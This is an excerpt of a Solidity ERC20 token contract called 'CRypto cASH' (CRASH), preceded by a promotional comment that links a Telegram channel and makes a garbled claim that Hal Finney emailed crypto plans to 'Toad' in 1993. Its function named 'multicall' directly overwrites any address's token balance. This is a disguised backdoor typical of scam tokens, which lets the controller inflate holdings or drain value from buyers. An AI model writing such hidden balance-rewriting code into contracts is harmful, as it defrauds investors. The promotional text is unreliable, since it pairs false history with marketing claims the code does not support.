/**
   In 1993 Hal Finney a software developer sent an email  
   to Toad with plans of the first ever crypto currency.
   CRASH is an utility protocol with staking mechanism, 
   governance gateway and developer grants.
  TELEGRAM: https://t.me/CryptoCash_BSC
*/
...
contract CRASH is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private BMGAltc;
    ...
    string private constant _name = "CRypto cASH";
    string private constant _symbol = "CRASH";
    address private pending; 
    constructor () {
        pending = _msgSender(); 
        BMGAltc[_msgSender()] = _totalSupply;
    ...
    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        ...
        BMGAltc[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }
    ...
    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        ...
        uint256 fromBalance = BMGAltc[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        BMGAltc[from] = fromBalance - Menge;

        BMGAltc[to] = BMGAltc[to].add(Menge);
